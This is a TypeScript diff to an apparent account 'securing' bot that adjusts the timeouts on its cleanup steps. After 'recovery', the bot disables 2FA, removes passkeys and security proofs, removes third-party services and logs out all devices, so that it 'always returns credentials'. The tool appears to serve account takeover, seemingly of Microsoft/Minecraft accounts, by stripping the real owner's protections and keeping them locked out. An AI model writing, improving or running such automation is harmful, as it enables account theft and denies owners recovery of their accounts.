@@ -1825,32 +1825,39 @@ export async function runSecureBot(
       await log("warn", `[secure] MC profile skipped: ${e instanceof Error ? e.message : e}`);
     }
 
-    // Best-effort cleanup AFTER recovery success — hard budget so we always return credentials
-    const cleanupBudgetMs = 40_000;
+    // Best-effort cleanup AFTER recovery success — hard budget so we always return credentials.
+    // On any timeout, drop remaining cleanup (hung ms_session must not block complete).
+    const cleanupBudgetMs = 35_000;
     const cleanupDeadline = Date.now() + cleanupBudgetMs;
-    const cleanupLeft = () => Math.max(2_000, cleanupDeadline - Date.now());
+    let cleanupStop = false;
     const runCleanup = async (label: string, fn: () => Promise<unknown>, maxMs: number) => {
-      if (Date.now() >= cleanupDeadline) {
-        await log("warn", `[secure] skip ${label} (cleanup budget exhausted)`);
+      if (cleanupStop || Date.now() >= cleanupDeadline) {
+        await log("warn", `[secure] skip ${label} (cleanup budget / stop)`);
         return;
       }
-      const ms = Math.min(maxMs, cleanupLeft());
+      const ms = Math.min(maxMs, Math.max(2_000, cleanupDeadline - Date.now()));
       try {
         await log("info", `[secure] ${label}...`);
         await withTimeout(fn(), ms, label);
       } catch (e) {
         await log("warn", `[secure] ${label}: ${e instanceof Error ? e.message : e}`);
+        cleanupStop = true;
+        try {
+          await closeMsSession();
+        } catch {
+          /* ignore */
+        }
       }
     };
 
     if (apiCanary) {
-      await runCleanup("Disabling 2FA", () => remove2FA(jar, apiCanary), 10_000);
-      await runCleanup("Removing passkeys", () => removeZyger(jar, apiCanary), 10_000);
-      await runCleanup("Removing security proofs", () => removeProofs(jar, apiCanary), 15_000);
+      await runCleanup("Disabling 2FA", () => remove2FA(jar, apiCanary), 8_000);
+      await runCleanup("Removing passkeys", () => removeZyger(jar, apiCanary), 8_000);
+      await runCleanup("Removing security proofs", () => removeProofs(jar, apiCanary), 12_000);
     }
-    await runCleanup("Removing third-party services", () => removeServices(jar), 12_000);
+    await runCleanup("Removing third-party services", () => removeServices(jar), 10_000);
     if (apiCanary) {
-      await runCleanup("Logging out all devices", () => logoutAll(jar, apiCanary), 8_000);
+      await runCleanup("Logging out all devices", () => logoutAll(jar, apiCanary), 6_000);
     }
 
     await log("info", "[secure] Securing pipeline complete!");
